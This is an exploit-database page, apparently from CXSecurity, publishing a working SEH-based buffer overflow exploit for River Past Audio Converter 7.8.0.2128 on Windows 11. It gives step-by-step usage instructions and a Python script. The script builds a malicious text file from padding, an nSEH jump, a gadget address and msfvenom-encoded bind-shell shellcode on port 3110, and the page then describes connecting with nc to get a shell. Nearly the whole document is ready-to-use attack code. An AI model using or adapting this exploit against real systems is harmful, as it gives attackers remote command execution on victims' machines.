---
title: River_Past_Audio_Converter - Buffer Overflow (SEH)
url: https://cxsecurity.com/issue/WLB-2025120028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-27
fetch_date: 2025-12-28T03:34:45.578129
---

# River_Past_Audio_Converter - Buffer Overflow (SEH)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **River\_Past\_Audio\_Converter - Buffer Overflow (SEH)** **2025.12.27**  Credit:  **[Achilles](https://cxsecurity.com/author/Achilles/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: River\_Past\_Audio\_Converter - Buffer Overflow (SEH)
# Date: 27.12.2025
# Software Link :https://river-past-audio-converter.software.informer.com/download/?caef29
# Exploit Author: Achilles
# Tested Version: 7.8.0.2128
# Tested on: Windows 11 64bit
# 1.- Run python code : River\_Past\_Audio\_Converter.py
# 2.- Open EVIL.txt and copy All content to Clipboard
# 3.- Open River\_PastAudio\_Converter.exe and click on the 'Options' inside fhe 'File' menu
# 4.- Paste the Content of EVIL.txt into the 'Lame\_enc.dll' name field.
# 5.- Click 'OK'
# 6.- Nc.exe Local IP Port 3110 and you will have a bind shell
# 7.- Greetings go:XiDreamzzXi,Metatron
#!/usr/bin/env python
import struct
buffer = "\x41" \* 280
nseh = "\xeb\x06\x90\x90" #jmp short 6
seh = struct.pack('<L',0x100119e7) #pop ebx # pop ebp # ret rvebscut.dll
nops = "\x90" \* 20
#msfvenom -a x86 --platform windows -p windows/shell\_bind\_tcp LPORT=3110 -e x86/shikata\_ga\_nai -b "\x00\x0a\x0d\x2f" -i 1 -f python
shellcode = ("\xd9\xcf\xbb\x33\xdd\xa3\xbb\xd9\x74\x24\xf4\x58"
"\x2b\xc9\xb1\x53\x31\x58\x17\x03\x58\x17\x83\xdb"
"\x21\x41\x4e\xe7\x32\x04\xb1\x17\xc3\x69\x3b\xf2"
"\xf2\xa9\x5f\x77\xa4\x19\x2b\xd5\x49\xd1\x79\xcd"
"\xda\x97\x55\xe2\x6b\x1d\x80\xcd\x6c\x0e\xf0\x4c"
"\xef\x4d\x25\xae\xce\x9d\x38\xaf\x17\xc3\xb1\xfd"
"\xc0\x8f\x64\x11\x64\xc5\xb4\x9a\x36\xcb\xbc\x7f"
"\x8e\xea\xed\x2e\x84\xb4\x2d\xd1\x49\xcd\x67\xc9"
"\x8e\xe8\x3e\x62\x64\x86\xc0\xa2\xb4\x67\x6e\x8b"
"\x78\x9a\x6e\xcc\xbf\x45\x05\x24\xbc\xf8\x1e\xf3"
"\xbe\x26\xaa\xe7\x19\xac\x0c\xc3\x98\x61\xca\x80"
"\x97\xce\x98\xce\xbb\xd1\x4d\x65\xc7\x5a\x70\xa9"
"\x41\x18\x57\x6d\x09\xfa\xf6\x34\xf7\xad\x07\x26"
"\x58\x11\xa2\x2d\x75\x46\xdf\x6c\x12\xab\xd2\x8e"
"\xe2\xa3\x65\xfd\xd0\x6c\xde\x69\x59\xe4\xf8\x6e"
"\x9e\xdf\xbd\xe0\x61\xe0\xbd\x29\xa6\xb4\xed\x41"
"\x0f\xb5\x65\x91\xb0\x60\x13\x99\x17\xdb\x06\x64"
"\xe7\x8b\x86\xc6\x80\xc1\x08\x39\xb0\xe9\xc2\x52"
"\x59\x14\xed\x50\xbc\x91\x0b\x02\xd0\xf7\x84\xba"
"\x12\x2c\x1d\x5d\x6c\x06\x35\xc9\x25\x40\x82\xf6"
"\xb5\x46\xa4\x60\x3e\x85\x70\x91\x41\x80\xd0\xc6"
"\xd6\x5e\xb1\xa5\x47\x5e\x98\x5d\xeb\xcd\x47\x9d"
"\x62\xee\xdf\xca\x23\xc0\x29\x9e\xd9\x7b\x80\xbc"
"\x23\x1d\xeb\x04\xf8\xde\xf2\x85\x8d\x5b\xd1\x95"
"\x4b\x63\x5d\xc1\x03\x32\x0b\xbf\xe5\xec\xfd\x69"
"\xbc\x43\x54\xfd\x39\xa8\x67\x7b\x46\xe5\x11\x63"
"\xf7\x50\x64\x9c\x38\x35\x60\xe5\x24\xa5\x8f\x3c"
"\xed\xd5\xc5\x1c\x44\x7e\x80\xf5\xd4\xe3\x33\x20"
"\x1a\x1a\xb0\xc0\xe3\xd9\xa8\xa1\xe6\xa6\x6e\x5a"
"\x9b\xb7\x1a\x5c\x08\xb7\x0e")
payload = buffer + nseh + seh + nops + shellcode
try:
f=open("Evil.txt","w")
print "[+] Creating %s bytes evil payload.." %len(payload)
f.write(payload)
f.close()
print "[+] File created!"
except:
print "File cannot be created"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top